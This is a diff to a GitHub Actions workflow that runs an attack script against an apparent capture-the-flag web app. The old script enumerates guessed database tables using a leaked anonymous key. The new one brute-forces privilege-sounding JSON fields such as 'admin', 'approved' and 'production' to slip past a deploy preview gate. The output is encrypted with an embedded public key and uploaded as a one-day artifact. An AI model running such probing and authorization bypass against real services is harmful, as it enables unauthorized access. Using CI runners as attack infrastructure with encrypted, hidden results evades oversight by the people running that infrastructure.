@@ -12,7 +12,7 @@ jobs:
     runs-on: ubuntu-latest
     timeout-minutes: 5
     steps:
-      - name: Discover deploy-related Data API tables and encrypt hits
+      - name: Bulk probe secondary deploy/release JSON fields after preview gate
         shell: bash
         run: |
           set -euo pipefail
@@ -30,32 +30,33 @@ jobs:
           -----END PUBLIC KEY-----
           PEM
           python3 - <<'PY'
-          import requests, pathlib, urllib.parse, json, concurrent.futures
+          import requests, pathlib, urllib.parse, json, itertools, copy
           base='https://task-launchlet-web-medium-18cf6be4db586bb6.caplag-task.ru/'
           out=pathlib.Path('package/out'); s=requests.Session(); s.headers['User-Agent']='Mozilla/5.0'
-          boot=s.get(urllib.parse.urljoin(base,'/api/app/bootstrap'),timeout=15).json()
-          root=boot['api']['dataApiBase'].rstrip('/')+'/'
-          auth={'Accept':'application/json','apikey':boot['client']['anonKey'],'Authorization':'Bearer '+boot['client']['session']}
-          tables=[
-            'deploy','deploys','deployment','deployments','deploy_refs','deployment_refs','deploy_references','deployment_references','preview_deploys','preview_deployments','deploy_previews','deployment_previews','preview_deploy_refs','preview_deployment_refs',
-            'deploy_records','deployment_records','deployments_view','deployment_view','deploy_view','preview_deploy_view','preview_deployments_view','deploy_inspector','deployment_inspector','deploy_inspections','deployment_inspections','deploy_metadata','deployment_metadata','deploy_meta','deployment_meta',
-            'deploy_jobs','deployment_jobs','preview_jobs','release_jobs','publish_jobs','deploy_queue','deployment_queue','preview_queue','release_queue','publish_queue','deploy_targets','deployment_targets','release_targets','preview_targets','publish_targets',
-            'releases','release','release_records','release_deploys','release_deployments','release_previews','release_refs','release_references','publishes','publications','publish_deploys','published_deploys','preview_releases',
-            'environments','environment','project_environments','deploy_environments','deployment_environments','preview_environments','release_environments','build_deploys','build_deployments','project_deploys','project_deployments','workspace_deploys','workspace_deployments',
-            'server_actions','server_references','action_refs','action_references','runtime_refs','runtime_references','preview_contexts','preview_sessions','preview_capabilities','deploy_contexts','deployment_contexts','launches','launchlet_deploys','launchlet_deployments','artifacts','build_artifacts','deploy_artifacts','release_artifacts'
-          ]
-          tables=list(dict.fromkeys(tables))
-          def probe(t):
-              try:
-                  r=requests.get(urllib.parse.urljoin(base,root+t+'?select=*'),headers={**auth,'User-Agent':'Mozilla/5.0'},timeout=8,allow_redirects=False)
-                  if r.status_code!=404:
-                      return {'table':t,'status':r.status_code,'body':r.text[:20000],'headers':dict(r.headers)}
-              except Exception: pass
-          hits=[]
-          with concurrent.futures.ThreadPoolExecutor(max_workers=20) as ex:
-              for x in ex.map(probe,tables):
-                  if x: hits.append(x)
-          (out/'summary.json').write_text(json.dumps({'count':len(tables),'hits':hits},indent=2))
+          boot=s.get(urllib.parse.urljoin(base,'/api/app/bootstrap'),timeout=15).json(); mf=s.get(urllib.parse.urljoin(base,boot['api']['buildManifest']),timeout=15).json(); refs=s.get(urllib.parse.urljoin(base,boot['api']['serverReferences']),timeout=15).json(); act=refs['serverActions']['inspectDeploy']; url=urllib.parse.urljoin(base,act['endpoint'])
+          fixed={'Accept':'application/json','Content-Type':'application/json','X-Launchlet-Preview':boot['project']}
+          basebody={'actionId':act['id'],'args':{'workspaceId':boot['workspace'],'projectId':boot['project']}}
+          br=s.post(url,headers=fixed,json=basebody,timeout=15,allow_redirects=False); baseline=(br.status_code,br.text.strip())
+          keys=['deploy','deployment','deployRef','deploymentRef','deploy_ref','deployment_ref','release','releaseRef','release_ref','export','exportDeploy','export_deploy','publish','publishDeploy','publish_deploy','inspect','inspector','mode','stage','environment','scope','role','capability','deployCapability','releaseCapability','token','deployToken','releaseToken','approval','approved','review','finalReview','final_review','final','internal','production','enterprise','grant','permission','access','deployAccess','releaseAccess','context','deployContext','releaseContext','target','deployTarget','releaseTarget','channel','lane','tier','policy','authorization','auth','key','deployKey','releaseKey','status','state','intent','purpose','operation','command','control','admin','privileged','trusted','server','runtime']
+          values=[True,1,'1','true','yes','on','enabled','active','allow','allowed','approved','reviewed','final','final-review','deploy','deployment','release','production','prod','enterprise','internal','admin','operator','export','publish','inspect','inspector','trusted','privileged','server','runtime','preview-only','release-ready','production-ready','enterprise-rollout','release:deploy','deploy:inspect','preview:deploy','preview:deploy:inspect','preview-8b11c',boot['project'],boot['workspace'],mf['build'],mf['previewReceipt'],act['id'],refs['runtime']]
+          hits=[]; tries=0
+          # Pack many candidate keys at once, same value. Do top-level and args separately.
+          batches=[keys[i:i+35] for i in range(0,len(keys),35)]
+          stop=False
+          for shape in ['top','args']:
+            for bi,batch in enumerate(batches):
+              for v in values:
+                tries+=1; b=copy.deepcopy(basebody)
+                if shape=='top': b.update({k:v for k in batch})
+                else: b['args'].update({k:v for k in batch})
+                try:r=s.post(url,headers=fixed,json=b,timeout=10,allow_redirects=False)
+                except Exception:continue
+                if (r.status_code,r.text.strip())!=baseline:
+                  hits.append({'shape':shape,'batch':bi,'keys':batch,'value':v,'status':r.status_code,'body':r.text,'headers':dict(r.headers)})
+                  if 'caplag{' in r.text or (r.status_code==200 and 'preview-only' not in r.text): stop=True; break
+              if stop: break
+            if stop: break
+          (out/'summary.json').write_text(json.dumps({'baseline':{'status':baseline[0],'body':baseline[1]},'tries':tries,'hits':hits},indent=2))
           PY
           tar -C package/out -czf package/result.tgz .
           openssl rand 32 > package/aes.key
@@ -71,6 +72,6 @@ jobs:
           rm -rf package
       - uses: actions/upload-artifact@v4
         with:
-          name: launchlet-part2-tables-encrypted
+          name: launchlet-part2-secondary-body-encrypted
           path: artifact/
           retention-days: 1
